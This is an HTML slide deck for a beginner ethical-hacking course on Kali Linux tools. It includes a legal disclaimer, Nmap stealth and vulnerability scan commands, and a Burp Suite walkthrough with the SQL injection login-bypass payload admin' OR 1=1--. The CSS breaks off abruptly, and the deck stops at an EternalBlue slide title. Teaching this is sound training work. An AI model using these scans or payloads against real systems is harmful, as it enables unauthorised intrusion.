<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tools Ki Duniya — Practical Cybersecurity Tools</title>
    <link
        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600;700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --bg: #06050e;
            --sf: #0c0a1a;
            --cd: #141028;
            --bd: #26204a;
            --fg: #e4e0f8;
            --mt: #6a62a0;
            --ac: #B388FF;
            --ac2: #FF6E40;
            --acg: rgba(179, 136, 255, .07);
            --or2: rgba(255, 110, 64, .06);
            --rd: #FF5252;
            --gn: #69F0AE;
            --cy: #18FFFF;
            --amb: #FFD740;
            --pp: #EA80FC;
            --ppg: rgba(234, 128, 252, .05)
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box
        }

        html,
        body {
            height: 100%;
            overflow: hidden;
            background: var(--bg);
            color: var(--fg);
            font-family: 'Space Grotesk', sans-serif
        }

        .bgl {
            position: fixed;
            inset: 0;
            z-index: 0;
            pointer-events: none
        }

        .bggrid {
            background-image: linear-gradient(rgba(179, 136, 255, .01) 1px, transparent 1px), linear-gradient(90deg, rgba(179, 136, 255, .01) 1px, transparent 1px);
            background-size: 48px 48px
        }

        .bg1 {
            width: 600px;
            height: 600px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(179, 136, 255, .04) 0%, transparent 70%);
            position: absolute;
            top: -200px;
            right: -100px;
            animation: g1 25s ease-in-out infinite
        }

        .bg2 {
            width: 500px;
            height: 500px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255, 110, 64, .025) 0%, transparent 70%);
            position: absolute;
            bottom: -160px;
            left: -80px;
            animation: g2 30s ease-in-out infinite
        }

        .bg3 {
            width: 350px;
            height: 350px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(24, 255, 255, .015) 0%, transparent 70%);
            position: absolute;
            top: 45%;
            left: 22%;
            animation: g3 20s ease-in-out infinite
        }

        @keyframes g1 {

            0%,
            100% {
                transform: translate(0, 0)
            }

            50% {
                transform: translate(-80px, 60px)
            }
        }

        @keyframes g2 {

            0%,
            100% {
                transform: translate(0, 0)
            }

            50% {
                transform: translate(60px, -45px)
            }
        }

        @keyframes g3 {

            0%,
            100% {
                transform: translate(0, 0)
            }

            50% {
                transform: translate(-30px, 22px)
            }
        }

        #app {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            height: 100vh
        }

        .tbar {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 16px;
            background: rgba(12, 10, 26, .9);
            backdrop-filter: blur(14px);
            border-bottom: 1px solid var(--bd);
            flex-shrink: 0
        }

        .tbar .lo {
            color: var(--ac);
            font-weight: 700;
            font-size: 12px;
            letter-spacing: .5px;
            font-family: 'Fira Code', monospace
        }

        .tbar .ti {
            color: var(--mt);
            font-size: 11px;
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis
        }

        .tb {
            background: none;
            border: 1px solid var(--bd);
            color: var(--mt);
            padding: 4px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 11px;
            font-family: inherit;
            transition: all .2s
        }

        .tb:hover {
            border-color: var(--ac);
            color: var(--ac)
        }

        .tb.on {
            border-color: var(--ac);
            color: var(--ac);
            background: var(--acg)
        }

        .ma {
            flex: 1;
            display: flex;
            overflow: hidden;
            position: relative
        }

        .cp {
            width: 265px;
            background: rgba(12, 10, 26, .93);
            backdrop-filter: blur(14px);
            border-right: 1px solid var(--bd);
            overflow-y: auto;
            flex-shrink: 0;
            transform: translateX(-100%);
            transition: transform .3s ease;
            position: absolute;
            z-index: 10;
            height: 100%
        }

        .cp.op {
            transform: translateX(0)
        }

        .cp::-webkit-scrollbar {
            width: 3px
        }

        .cp::-webkit-scrollbar-thumb {
            background: var(--bd);
            border-radius: 3px
        }

        .ch {
            padding: 11px 13px;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 1.4px;
            color: var(--mt);
            border-bottom: 1px solid var(--bd);
            font-weight: 600
        }

        .ci {
            display: flex;
            align-items: center;
            gap: 7px;
            padding: 6px 13px;
            cursor: pointer;
            border-left: 3px solid transparent;
            transition: all .2s;
            font-size: 10px;
            color: var(--mt);
            line-height: 1.3
        }

        .ci:hover {
            background: rgba(0, 191, 165, .03);
            color: var(--fg)
        }

        .ci.on {
            border-left-color: var(--ac);
            color: var(--ac);
            background: var(--acg)
        }

        .ci .nm {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 8px;
            font-weight: 600;
            border: 1px solid var(--bd);
            flex-shrink: 0;
            font-family: 'Fira Code', monospace
        }

        .ci.on .nm {
            border-color: var(--ac);
            background: var(--acg)
        }

        .pw {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 12px;
            min-width: 0
        }

        .pl {
            width: 100%;
            max-width: 1100px;
            aspect-ratio: 16/9;
            background: var(--sf);
            border-radius: 11px;
            overflow: hidden;
            border: 1px solid var(--bd);
            box-shadow: 0 0 60px rgba(0, 191, 165, .02), 0 18px 50px rgba(0, 0, 0, .5);
            display: flex;
            flex-direction: column;
            position: relative
        }

        .pl::after {
            content: '';
            position: absolute;
            inset: 0;
            pointer-events: none;
            z-index: 5;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 191, 165, .003) 2px, rgba(0, 191, 165, .003) 4px)
        }

        .sa {
            flex: 1;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column
        }

        .sl {
            position: absolute;
            inset: 0;
            padding: 26px 34px;
            display: flex;
            flex-direction: column;
            opacity: 0;
            transform: translateX(24px);
            transition: opacity .4s ease, transform .4s ease;
            overflow-y: auto;
            z-index: 1
        }

        .sl.on {
            opacity: 1;
            transform: translateX(0);
            z-index: 2
        }

        .sl.ex {
            opacity: 0;
            transform: translateX(-24px);
            z-index: 1
        }

        .sl::-webkit-scrollbar {
            width: 3px
        }

        .sl::-webkit-scrollbar-thumb {
            background: var(--bd);
            border-radius: 3px
        }

        .slb {
            font-family: 'Fira Code', monospace;
            font-size: 9px;
            color: var(--ac);
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-bottom: 4px;
            flex-shrink: 0
        }

        .slt {
            font-size: clamp(15px, 2.4vw, 24px);
            font-weight: 700;
            line-height: 1.2;
            margin-bottom: 11px;
            flex-shrink: 0;
            background: linear-gradient(135deg, var(--fg) 0%, var(--mt) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent
        }

        .sbd {
            flex: 1;
            overflow-y: auto;
            padding-right: 4px
        }

        .sbd::-webkit-scrollbar {
            width: 3px
        }

        .sbd::-webkit-scrollbar-thumb {
            background: var(--bd);
            border-radius: 3px
        }

        .bl {
            list-style: none;
            display: flex;
            flex-direction: column;
            gap: 6px
        }

        .bl li {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            font-size: clamp(10px, 1.25vw, 13px);
            line-height: 1.5;
            color: rgba(228, 232, 240, .85);
            opacity: 0;
            transform: translateY(6px);
            animation: bi .35s ease forwards
        }

        .bl li .d {
            width: 5px;
            height: 5px;
            border-radius: 50%;
            background: var(--ac);
            flex-shrink: 0;
            margin-top: 6px
        }

        @keyframes bi {
            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        .tbl {
            width: 100%;
            border-collapse: collapse;
            font-size: clamp(8px, 1.02vw, 11px)
        }

        .tbl thead th {
            text-align: left;
            padding: 5px 7px;
            border-bottom: 2px solid var(--ac);
            color: var(--ac);
            font-weight: 600;
            font-family: 'Fira Code', monospace;
            font-size: clamp(7px, .9vw, 9px);
            text-transform: uppercase;
            letter-spacing: .3px
        }

        .tbl tbody td {
            padding: 4px 7px;
            border-bottom: 1px solid var(--bd);
            color: rgba(228, 232, 240, .76);
            vertical-align: top
        }

        .tbl tbody tr:hover {
            background: rgba(0, 191, 165, .02)
        }

        .code {
            background: #060a12;
            border: 1px solid var(--bd);
            border-radius: 6px;
            padding: 10px 13px;
            font-family: 'Fira Code', monospace;
            font-size: clamp(8px, 1.02vw, 11px);
            line-height: 1.7;
            overflow-x: auto
        }

        .code .kw {
            color: var(--pp)
        }

        .code .fn {
            color: var(--cy)
        }

        .code .sr {
            color: var(--gn)
        }

        .code .nm {
            color: var(--amb)
        }

        .code .cm {
            color: var(--mt);
            font-style: italic
        }

        .code .op {
            color: var(--rd)
        }

        .code .fl {
            color: var(--ac2)
        }

        .tc2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 9px
        }

        .cd {
            background: var(--cd);
            border: 1px solid var(--bd);
            border-radius: 7px;
            padding: 10px;
            border-top: 3px solid
        }

        .cd h4 {
            font-size: clamp(9px, 1.15vw, 12px);
            font-weight: 600;
            margin-bottom: 5px
        }

        .wb {
            background: rgba(255, 82, 82, .05);
            border: 1px solid rgba(255, 82, 82, .1);
            border-radius: 6px;
            padding: 7px 10px;
            font-size: 10px;
            color: var(--rd);
            display: flex;
            align-items: flex-start;
            gap: 6px;
            margin-top: 7px
        }

        .ib {
            background: var(--or2);
            border: 1px solid rgba(255, 109, 0, .1);
            border-radius: 6px;
            padding: 7px 10px;
            font-size: 10px;
            color: var(--ac2);
            display: flex;
            align-items: flex-start;
            gap: 6px;
            margin-top: 7px
        }

        .fb {
            background: rgba(0, 191, 165, .05);
            border: 1px solid rgba(0, 191, 165, .1);
            border-radius: 6px;
            padding: 7px 10px;
            font-size: 10px;
            color: var(--ac);
            display: flex;
            align-items: flex-start;
            gap: 6px;
            margin-top: 7px
        }

        .ab {
            background: rgba(255, 213, 79, .05);
            border: 1px solid rgba(255, 213, 79, .1);
            border-radius: 6px;
            padding: 7px 10px;
            font-size: 10px;
            color: var(--amb);
            display: flex;
            align-items: flex-start;
            gap: 6px;
            margin-top: 7px
        }

        .ts {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            height: 100%
        }

        .ts .mt {
            font-size: clamp(17px, 2.8vw, 36px);
            font-weight: 800;
            line-height: 1.1;
            margin-bottom: 8px;
            background: linear-gradient(135deg, var(--ac) 0%, var(--ac2) 50%, var(--cy) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent
        }

        .ts .ms {
            color: var(--mt);
            font-size: clamp(9px, 1.15vw, 13px);
            max-width: 480px;
            line-height: 1.5
        }

        .ts .ht {
            margin-top: 22px;
            color: var(--ac);
            font-family: 'Fira Code', monospace;
            font-size: 10px;
            animation: pu 2s ease-in-out infinite
        }

        @keyframes pu {

            0%,
            100% {
                opacity: .3
            }

            50% {
                opacity: 1
            }
        }

        .tool-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 5px
        }

        .tool-card {
            background: var(--cd);
            border: 1px solid var(--bd);
            border-radius: 6px;
            padding: 7px 9px;
            text-align: center;
            transition: all .2s;
            border-bottom: 2px solid transparent
        }

        .tool-card:hover {
            border-bottom-color: var(--ac);
            background: var(--acg)
        }

        .tool-card .tn {
            font-family: 'Fira Code', monospace;
            font-size: clamp(8px, 1.05vw, 10px);
            font-weight: 600;
            color: var(--fg)
        }

        .tool-card .tp {
            font-size: clamp(7px, .85vw, 9px);
            color: var(--mt);
            margin-top: 2px
        }

        .phase-row {
            display: flex;
            align-items: center;
            gap: 9px;
            padding: 5px 9px;
            border-radius: 5px;
            border-left: 3px solid;
            transition: all .2s
        }

        .phase-row:hover {
            transform: translateX(3px)
        }

        .phase-num {
            width: 26px;
            height: 26px;
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Fira Code', monospace;
            font-size: 9px;
            font-weight: 700;
            flex-shrink: 0
        }

        .phase-body {
            flex: 1
        }

        .phase-name {
            font-weight: 600;
            font-size: clamp(9px, 1.15vw, 12px)
        }

        .phase-desc {
            color: var(--mt);
            font-size: clamp(8px, .95vw, 10px);
            margin-top: 1px
        }

        .warn-box {
            background: rgba(255, 82, 82, .06);
            border: 2px solid rgba(255, 82, 82, .2);
            border-radius: 10px;
            padding: 16px 20px;
            text-align: center
        }

        .warn-box .wt {
            color: var(--rd);
            font-size: clamp(14px, 1.8vw, 20px);
            font-weight: 700;
            font-family: 'Fira Code', monospace;
            margin-bottom: 6px
        }

        .warn-box .wd {
            color: rgba(255, 82, 82, .8);
            font-size: clamp(9px, 1.1vw, 12px);
            line-height: 1.5
        }

        .chain-step {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 5px 9px;
            background: var(--cd);
            border: 1px solid var(--bd);
            border-radius: 5px;
            font-size: clamp(8px, 1vw, 10px)
        }

        .chain-arrow {
            display: flex;
            justify-content: center;
            color: var(--ac);
            font-size: 11px
        }

        .si2 {
            position: absolute;
            bottom: 7px;
            right: 11px;
            z-index: 10;
            display: flex;
            align-items: center;
            gap: 4px;
            font-family: 'Fira Code', monospace;
            font-size: 8px;
            color: var(--ac);
            opacity: 0;
            transition: opacity .3s
        }

        .si2.vis {
            opacity: 1
        }

        .sbs {
            display: flex;
            gap: 1px;
            align-items: end;
            height: 9px
        }

        .sb2 {
            width: 2px;
            background: var(--ac);
            border-radius: 1px;
            animation: sba .45s ease-in-out infinite
        }

        .sb2:nth-child(1) {
            height: 3px;
            animation-delay: 0s
        }

        .sb2:nth-child(2) {
            height: 7px;
            animation-delay: .1s
        }

        .sb2:nth-child(3) {
            height: 9px;
            animation-delay: .2s
        }

        .sb2:nth-child(4) {
            height: 5px;
            animation-delay: .07s
        }

        @keyframes sba {

            0%,
            100% {
                transform: scaleY(.3)
            }

            50% {
                transform: scaleY(1)
            }
        }

        .ct {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 5px 9px;
            background: rgba(5, 8, 16, .95);
            border-top: 1px solid var(--bd);
            flex-shrink: 0;
            position: relative;
            z-index: 10
        }

        .ctb {
            background: none;
            border: none;
            color: var(--mt);
            cursor: pointer;
            font-size: 11px;
            width: 25px;
            height: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            transition: all .15s
        }

        .ctb:hover {
            color: var(--fg);
            background: rgba(255, 255, 255, .04)
        }

        .ctb.pb {
            font-size: 13px;
            color: var(--ac)
        }

        .pw3 {
            flex: 1;
            height: 4px;
            background: var(--bd);
            border-radius: 2px;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            min-width: 38px
        }

        .pf2 {
            height: 100%;
            background: linear-gradient(90deg, #00796B, var(--ac));
            border-radius: 2px;
            transition: width .3s linear;
            position: relative
        }

        .pf2::after {
            content: '';
            position: absolute;
            right: -4px;
            top: 50%;
            transform: translateY(-50%);
            width: 9px;
            height: 9px;
            border-radius: 50%;
            background: var(--ac);
            opacity: 0;
            transition: opacity .2s;
            box-shadow: 0 0 6px var(--ac)
        }

        .pw3:hover .pf2::after {
            opacity: 1
        }

        .tdi {
            font-family: 'Fira Code', monospace;
            font-size: 8px;
            color: var(--mt);
            white-space: nowrap
        }

        .ss2 {
            background: var(--cd);
            border: 1px solid var(--bd);
            color: var(--ac);
            padding: 2px 4px;
            border-radius: 3px;
            font-family: 'Fira Code', monospace;
            font-size: 8px;
            cursor: pointer;
            outline: none
        }

        .ss2:focus {
            border-color: var(--ac)
        }

        .vs2 {
            display: flex;
            align-items: center;
            gap: 3px
        }

        .vsl2 {
            width: 38px;
            height: 3px;
            -webkit-appearance: none;
            appearance: none;
            background: var(--bd);
            border-radius: 2px;
            outline: none;
            cursor: pointer
        }

        .vsl2::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--ac);
            cursor: pointer
        }

        .io2 {
            position: absolute;
            inset: 0;
            z-index: 20;
            background: var(--sf);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity .5s ease, visibility .5s
        }

        .io2.hid {
            opacity: 0;
            visibility: hidden;
            pointer-events: none
        }

        .io2 .ic {
            font-size: 36px;
            color: var(--ac);
            margin-bottom: 12px
        }

        .io2 .it2 {
            font-size: clamp(14px, 2.2vw, 28px);
            font-weight: 700;
            margin-bottom: 4px
        }

        .io2 .is2 {
            color: var(--mt);
            font-size: 11px;
            margin-bottom: 20px;
            text-align: center;
            max-width: 440px;
            line-height: 1.5
        }

        .sbt {
            background: var(--ac);
            color: #fff;
            border: none;
            padding: 9px 28px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
            transition: all .2s;
            box-shadow: 0 0 20px rgba(0, 191, 165, .2)
        }

        .sbt:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 28px rgba(0, 191, 165, .3)
        }

        .eo2 {
            position: absolute;
            inset: 0;
            z-index: 20;
            background: rgba(5, 8, 16, .93);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            visibility: hidden;
            transition: opacity .5s, visibility .5s
        }

        .eo2.vis {
            opacity: 1;
            visibility: visible
        }

        .eo2 .et2 {
            font-size: 20px;
            font-weight: 700;
            color: var(--ac);
            margin-bottom: 5px
        }

        .eo2 .es2 {
            color: var(--mt);
            margin-bottom: 16px;
            font-size: 11px
        }

        .rbt {
            background: none;
            border: 2px solid var(--ac);
            color: var(--ac);
            padding: 7px 22px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
            transition: all .2s
        }

        .rbt:hover {
            background: var(--ac);
            color: #fff
        }

        .tst2 {
            position: fixed;
            bottom: 56px;
            left: 50%;

    <div class="tst2" id="tst3"></div>
    <script>
        const D = [
            {
                t: "Tools Ki Duniya — The Practical Beginning", lb: "Introduction",
                n: "Tools Ki Duniya, the Practical Beginning. This voice-guided presentation covers the five pillars of Kali Linux tools that every ethical hacker must master. Nmap for network scanning, Burp Suite for web application testing, Metasploit for system exploitation, Wireshark for packet analysis, and John the Ripper with Hashcat for password cracking. These tools follow the Cyber Kill Chain from reconnaissance to credential harvesting.",
                h: `<div class="ts"><div class="mt">Tools Ki Duniya<br>The Practical Beginning</div><div class="ms">Nmap &bull; Burp Suite &bull; Metasploit &bull; Wireshark &bull; John the Ripper &bull; Hashcat — Five Pillars of Kali Linux</div><div class="ht"><i class="fas fa-play"></i>&ensp;Press play to begin narration</div></div>`
            },

            {
                t: "Legal Disclaimer — Know Your Boundaries", lb: "Legal Notice",
                n: "Before we type a single command, listen very carefully. The tools demonstrated here are incredibly powerful. Using them against any network, website, or system without explicit written permission is a serious crime under laws like the Computer Fraud and Abuse Act and international cybercrime legislation. It can lead to massive fines and real prison time. Everything shown here is performed in a closed, isolated virtual lab environment. You must pledge to use this knowledge ethically.",
                h: `<div class="warn-box">
<div class="wt"><i class="fas fa-exclamation-triangle"></i> WARNING: STRICTLY FOR EDUCATIONAL PURPOSES</div>
<div class="wd">
<ul style="list-style:none;text-align:left;max-width:420px;margin:8px auto 0;display:flex;flex-direction:column;gap:6px">
<li style="display:flex;align-items:flex-start;gap:6px"><i class="fas fa-gavel" style="color:var(--rd);margin-top:3px"></i><span>Using offensive tools without <strong>written authorization</strong> is a criminal offense under CFAA, IT Act, and international law</span></li>
<li style="display:flex;align-items:flex-start;gap:6px"><i class="fas fa-lock" style="color:var(--rd);margin-top:3px"></i><span>All demonstrations are in <strong>isolated virtual lab environments</strong> — never against live targets</span></li>
<li style="display:flex;align-items:flex-start;gap:6px"><i class="fas fa-shield-halved" style="color:var(--rd);margin-top:3px"></i><span>Violations result in <strong>fines, imprisonment, and career destruction</strong></span></li>
<li style="display:flex;align-items:flex-start;gap:6px"><i class="fas fa-handshake" style="color:var(--ac);margin-top:3px"></i><span>If you are watching, you must agree to <strong>use this knowledge ethically</strong></span></li>
</ul></div></div>`},

            {
                t: "The Five Pillars of Kali Linux", lb: "Overview",
                n: "These five tools form the complete offensive security toolkit. Each maps to a specific phase of the Cyber Kill Chain. Nmap finds the doors through network reconnaissance. Burp Suite manipulates the locks through web application proxying. Metasploit kicks them down through exploitation frameworks. Wireshark watches the traffic through packet analysis. And John the Ripper with Hashcat break open the safes through cryptographic auditing. Together, they cover the entire attack lifecycle.",
                h: `<div style="display:flex;flex-direction:column;gap:4px">
<div class="phase-row" style="border-color:var(--ac);background:var(--acg)"><div class="phase-num" style="background:var(--acg);color:var(--ac)">01</div><div class="phase-body"><div class="phase-name" style="color:var(--ac)">Nmap — The Digital Radar</div><div class="phase-desc">Network scanning, port discovery, service fingerprinting, OS detection</div></div></div>
<div class="phase-row" style="border-color:var(--ac2);background:var(--or2)"><div class="phase-num" style="background:var(--or2);color:var(--ac2)">02</div><div class="phase-body"><div class="phase-name" style="color:var(--ac2)">Burp Suite — The Invisible Interceptor</div><div class="phase-desc">Web proxy, request interception, repeater, vulnerability scanning</div></div></div>
<div class="phase-row" style="border-color:var(--rd);background:rgba(255,82,82,.04)"><div class="phase-num" style="background:rgba(255,82,82,.06);color:var(--rd)">03</div><div class="phase-body"><div class="phase-name" style="color:var(--rd)">Metasploit — The Exploit Engine</div><div class="phase-desc">Modular exploitation, payload delivery, remote shell access</div></div></div>
<div class="phase-row" style="border-color:var(--cy);background:rgba(0,229,255,.04)"><div class="phase-num" style="background:rgba(0,229,255,.06);color:var(--cy)">04</div><div class="phase-body"><div class="phase-name" style="color:var(--cy)">Wireshark — The Network Detective</div><div class="phase-desc">Packet capture, protocol analysis, display filtering, TCP stream follow</div></div></div>
<div class="phase-row" style="border-color:var(--amb);background:rgba(255,213,79,.04)"><div class="phase-num" style="background:rgba(255,213,79,.06);color:var(--amb)">05</div><div class="phase-body"><div class="phase-name" style="color:var(--amb)">John the Ripper & Hashcat</div><div class="phase-desc">CPU and GPU-based password cracking, dictionary and brute-force attacks</div></div></div>
</div>
<div class="fb"><i class="fas fa-link"></i><span><strong>The Kill Chain:</strong> Nmap (Recon) → Burp (Weaponize) → Metasploit (Exploit) → Wireshark (Monitor) → JtR/Hashcat (Extract)</span></div>`},

            {
                t: "Nmap — The Digital Radar", lb: "Tool 1: Nmap",
                n: "Step one of any professional security assessment is reconnaissance. You cannot hack what you cannot see. Nmap is the undisputed gold standard for network scanning. Think of it as a high-tech radar system that pings every door on a digital fortress to see which ones are left unlocked. It comes pre-installed on Kali Linux and supports various scan types, each designed for specific situations and stealth requirements.",
                h: `<ul class="bl">
<li><div class="d"></div><span><strong style="color:var(--ac)">Network reconnaissance tool</strong> — discovers active hosts, open ports, and running services</span></li>
<li><div class="d"></div><span>Pre-installed on Kali Linux — <strong style="color:var(--ac)">zero configuration needed</strong></span></li>
<li><div class="d"></div><span><strong style="color:var(--ac)">Nmap Scripting Engine (NSE)</strong> — automates vulnerability detection with community scripts</span></li>
<li><div class="d"></div><span>Supports <strong style="color:var(--cy)">TCP, UDP, SYN, Connect, and OS fingerprinting</strong> scan types</span></li>
<li><div class="d"></div><span>Practice target: <code style="color:var(--ac);font-family:'Fira Code',monospace;font-size:inherit">scanme.nmap.org</code> — official public test server</span></li>
</ul>`},

            {
                t: "Nmap Scan Types and Commands", lb: "Nmap Commands",
                n: "The most critical command for professionals is the SYN stealth scan using the minus s capital S flag. This initiates a TCP handshake but drops it before completion, like knocking on a door and running away before they see your face. The minus p minus flag scans all 65,535 ports. The minus s T flag performs a full TCP connect scan when raw packets aren't available. The minus s U flag scans UDP services like DNS and SNMP. Each scan type has specific stealth and accuracy trade-offs.",
                h: `<table class="tbl">
<thead><tr><th>Flag</th><th>Scan Type</th><th>Mechanism</th></tr></thead>
<tbody>
<tr><td style="font-family:'Fira Code',monospace;color:var(--ac);font-weight:600">-sS</td><td>SYN Stealth</td><td>Starts TCP handshake, drops before completion — avoids most logs</td></tr>
<tr><td style="font-family:'Fira Code',monospace;color:var(--ac2);font-weight:600">-sT</td><td>TCP Connect</td><td>Full handshake — slower, logged, used when raw packets unavailable</td></tr>
<tr><td style="font-family:'Fira Code',monospace;color:var(--cy);font-weight:600">-sU</td><td>UDP Scan</td><td>Checks DNS, SNMP, and other UDP services</td></tr>
<tr><td style="font-family:'Fira Code',monospace;color:var(--amb);font-weight:600">-p-</td><td>All Ports</td><td>Scans all 65,535 ports — nothing hides</td></tr>
<tr><td style="font-family:'Fira Code',monospace;color:var(--pp);font-weight:600">--top-ports</td><td>Top N Ports</td><td>Scans most common ports only — faster reconnaissance</td></tr>
</tbody></table>
<div class="code" style="margin-top:7px"><span class="cm"># SYN Stealth Scan — all ports</span><br>nmap <span class="fl">-sS</span> <span class="fl">-p-</span> 192.168.1.50<br><br><span class="cm"># Service version detection + OS fingerprint</span><br>nmap <span class="fl">-sV</span> <span class="fl">-O</span> 192.168.1.50<br><br><span class="cm"># NSE vulnerability scripts</span><br>nmap <span class="fl">--script</span> vuln 192.168.1.50</div>`},

            {
                t: "Nmap Output Analysis", lb: "Nmap Results",
                n: "When Nmap completes its scan, the output reveals your attack surface. Port 22 open means SSH access is available. Port 80 open indicates a web server. Port 445 open signals Windows file sharing. Each open port is a potential entry point for exploitation. Nmap gives you the map, but it is up to your skills to navigate it. Understanding service versions is critical because outdated software versions directly map to known exploits in Metasploit.",
                h: `<div class="code" style="line-height:2">
<span class="fn">PORT</span>     <span class="fn">STATE</span>  <span class="fn">SERVICE</span>   <span class="fn">VERSION</span><br>
<span class="nm">22/tcp</span>   <span class="sr">open</span>   ssh         OpenSSH 7.9p1<br>
<span class="nm">80/tcp</span>   <span class="sr">open</span>   http        Apache 2.4.41<br>
<span class="nm">443/tcp</span>  <span class="sr">open</span>   https       Apache 2.4.41<br>
<span class="nm">445/tcp</span>  <span class="sr">open</span>   microsoft-ds Windows Server 2016<br>
<span class="nm">3306/tcp</span> <span class="sr">open</span>   mysql       MySQL 5.7.32<br>
</div>
<div class="ib"><i class="fas fa-crosshairs"></i><span><strong>Port 80 (Apache 2.4.41)</strong> → Target for Burp Suite web testing<br><strong>Port 445 (SMB)</strong> → Target for Metasploit exploitation<br><strong>Port 3306 (MySQL)</strong> → Target for credential attacks</span></div>`},

            {
                t: "Burp Suite — The Invisible Interceptor", lb: "Tool 2: Burp Suite",
                n: "With Nmap telling us there is a web server on port 80, we need to test it. Burp Suite is the Swiss Army knife of web application hacking. It operates as an intercepting proxy. Imagine passing a secret note to a friend, but someone intercepts it, reads it, changes a few words, and passes it along without your friend ever knowing. By routing browser traffic through local port 8080, Burp catches HTTP requests mid-flight for analysis and manipulation.",
                h: `<ul class="bl">
<li><div class="d" style="background:var(--ac2)"></div><span><strong style="color:var(--ac2)">Intercepting proxy</strong> — sits between browser and server, catching all HTTP/HTTPS traffic</span></li>
<li><div class="d" style="background:var(--ac2)"></div><span>Configure browser via <strong style="color:var(--cy)">FoxyProxy</strong> extension → localhost:8080</span></li>
<li><div class="d" style="background:var(--ac2)"></div><span><strong style="color:var(--ac2)">Proxy → Intercept</strong> tab captures live requests for manual modification</span></li>
<li><div class="d" style="background:var(--ac2)"></div><span><strong style="color:var(--cy)">Repeater</strong> tool lets you resend modified requests instantly for parameter testing</span></li>
<li><div class="d" style="background:var(--ac2)"></div><span>Community Edition is <strong style="color:var(--gn)">100% free</strong> — covers everything beginners need</span></li>
</ul>`},

            {
                t: "Burp Suite SQL Injection Demo", lb: "Burp Attack",
                n: "Here is a real attack workflow. You intercept a login form through Burp Suite. You see the POST request with username and password parameters in plaintext. You send this to Repeater and modify the username field to admin quote OR one equals one double dash. If the backend query is unparameterized, this bypasses authentication entirely. You just logged in as admin without knowing the password. This is SQL injection, the number one web vulnerability since the OWASP Top Ten began. Burp Suite makes finding and exploiting these trivially easy.",
                h: `<div class="code" style="margin-bottom:7px"><span class="cm"># Intercepted POST request</span><br>POST /login HTTP/1.1<br>Host: target.com<br><br>username=<span class="fl">admin' OR 1=1--</span>&password=<span class="fl">anything</span></div>
<div class="ib"><i class="fas fa-crosshairs"></i><span><strong>Result:</strong> SQL injection bypasses authentication. The query becomes <code style="color:var(--ac);font-family:'Fira Code',monospace">WHERE username='admin' OR 1=1--'</code> — always true, granting admin access.</span></div>`},

            {
                t: "Metasploit — The Exploit Engine", lb: "Tool 3: Metasploit",
                n: "Metasploit is the world's most widely used penetration testing framework. It contains thousands of pre-built exploit modules organized by target platform. Think of it as an arsenal of digital lock picks, each designed for a specific type of lock. Its modular architecture follows a four-step process: select an exploit matching the target vulnerability, configure a payload defining what happens after successful exploitation, set target parameters, and execute. Metasploit automates what would otherwise require writing custom exploit code from scratch.",
                h: `<ul class="bl">
<li><div class="d" style="background:var(--rd)"></div><span><strong style="color:var(--rd)">Largest exploit database</strong> — thousands of modules for every platform and service</span></li>
<li><div class="d" style="background:var(--rd)"></div><span><strong style="color:var(--rd)">Modular architecture</strong>: Exploit → Payload → Target → Execute</span></li>
<li><div class="d" style="background:var(--rd)"></div><span><strong style="color:var(--amb)">Meterpreter</strong> payload provides a full interactive shell on compromised systems</span></li>
<li><div class="d" style="background:var(--rd)"></div><span>Launch with <code style="color:var(--ac);font-family:'Fira Code',monospace">msfconsole</code> — the interactive Metasploit terminal</span></li>
<li><div class="d" style="background:var(--rd)"></div><span>Classic exploit: <strong style="color:var(--cy)">EternalBlue (ms17_010)</strong> — used in WannaCry ransomware attack</span></li>
</ul>`},

            {
                t: "Metasploit EternalBlue Workflow", lb: "MSF Attack",
